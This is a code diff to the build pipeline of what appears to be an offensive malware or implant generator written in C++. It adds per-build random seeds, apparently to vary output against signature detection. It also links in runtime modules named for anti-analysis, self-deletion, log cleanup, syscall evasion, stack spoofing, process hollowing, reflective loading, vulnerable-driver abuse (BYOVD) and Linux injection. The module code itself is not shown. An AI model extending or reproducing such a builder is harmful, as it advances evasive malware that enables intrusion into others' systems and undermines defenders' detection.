@@ -10,6 +10,7 @@
 #include <cstring>
 #include <cstdio>
 #include <filesystem>
+#include <random>
 #include <llvm/Support/raw_ostream.h>
 #include <llvm/Support/FileSystem.h>
 
@@ -320,7 +321,12 @@ bool Pipeline::emitLLVMIR(const CompileOptions& opts, const std::string& llPath)
             }
         }
         
-        std::string cmd = clang + " " + targetFlag + "-O1 -S -emit-llvm -Wno-override-module " + 
+        std::string extraFlags;
+        if (isWindowsTarget) {
+            extraFlags = "-mno-mmx -mno-sse -mno-sse2 ";
+        }
+        
+        std::string cmd = clang + " " + targetFlag + extraFlags + "-O1 -S -emit-llvm -Wno-override-module " + 
                           incFlags + " " + opts.inputFile + " -o " + llPath;
         if (!exec(cmd)) {
             std::cerr << "[!] Failed to generate LLVM IR from C source\n";
@@ -343,6 +349,13 @@ bool Pipeline::emitLLVMIR(const CompileOptions& opts, const std::string& llPath)
             auto ast = parser.parse();
 
             CodeGen codegen(opts.noRuntime);
+            // Generate unique seed for token diversification per build
+            std::random_device rd;
+            std::mt19937_64 rng(rd());
+            std::uniform_int_distribution<uint64_t> dist;
+            uint64_t seed = dist(rng);
+            codegen.setTokenSeed(seed);
+            std::cout << "[*] Token diversification seed: " << seed << "\n";
             auto mod = codegen.generate(*ast, opts.inputFile);
 
             std::error_code ec;
@@ -465,8 +478,8 @@ bool Pipeline::compileRuntime(const std::string& clang, const std::string& outDi
         runtimeDir / "init"    / "anti_analysis.c",
         runtimeDir / "cleanup" / "self_delete.c",
         runtimeDir / "cleanup" / "logs.c",
-        runtimeDir / "vm"      / "vm_interpreter.c",
-        runtimeDir / "util"    / "mem.c",
+        runtimeDir / "vm" / "vm_interpreter.c",
+        runtimeDir / "forensics" / "forensics_rt.c",
     };
 
     if (isWindowsTarget && !noRuntime) {
@@ -474,6 +487,7 @@ bool Pipeline::compileRuntime(const std::string& clang, const std::string& outDi
         sources.push_back(runtimeDir / "evasion"      / "syscalls.c");
         sources.push_back(runtimeDir / "evasion"      / "stack_spoof.c");
         sources.push_back(runtimeDir / "execution"    / "hollow.c");
+        sources.push_back(runtimeDir / "execution"    / "reflective.c");
         sources.push_back(runtimeDir / "execution"    / "byovd.c");
         sources.push_back(runtimeDir / "execution"    / "inmem.c");
         sources.push_back(runtimeDir / "execution"    / "driver_interact.c");
@@ -487,6 +501,8 @@ bool Pipeline::compileRuntime(const std::string& clang, const std::string& outDi
         fs::path byovdDir = runtimeDir / "byovd";
         incFlags += " -I" + byovdDir.string();
         sources.push_back(byovdDir / "byovd_modular.c");
+    } else if (!isWindowsTarget && !noRuntime) {
+        sources.push_back(runtimeDir / "execution" / "linux_inject.c");
     }
 
     for (const auto& src : sources) {
@@ -508,15 +524,19 @@ bool Pipeline::linkExecutable(const CompileOptions& opts, const std::string& cla
                               const std::string& obj, const std::vector<std::string>& runtimeObjs,
                               const std::string& exe) {
     std::string targetFlag = getTargetFlag(opts);
-    std::string cmd = clang + " " + targetFlag + obj;
+    std::string cmd = clang + " " + targetFlag;
+    if (opts.staticLink) {
+        cmd += "-static ";
+    }
+    cmd += obj;
     for (const auto& ro : runtimeObjs) {
         cmd += " " + ro;
     }
     cmd += " -o " + exe;
     bool isWindowsTarget = targetFlag.find("windows") != std::string::npos || targetFlag.find("mingw") != std::string::npos || targetFlag.find("msvc") != std::string::npos;
     if (isWindowsTarget) {
-        cmd += " -lntdll -lwinhttp -ldnsapi -lwevtapi";
-    } else {
+        cmd += " -lntdll";
+    } else if (!opts.staticLink) {
         cmd += " -ldl -lpthread";
     }
     return exec(cmd);
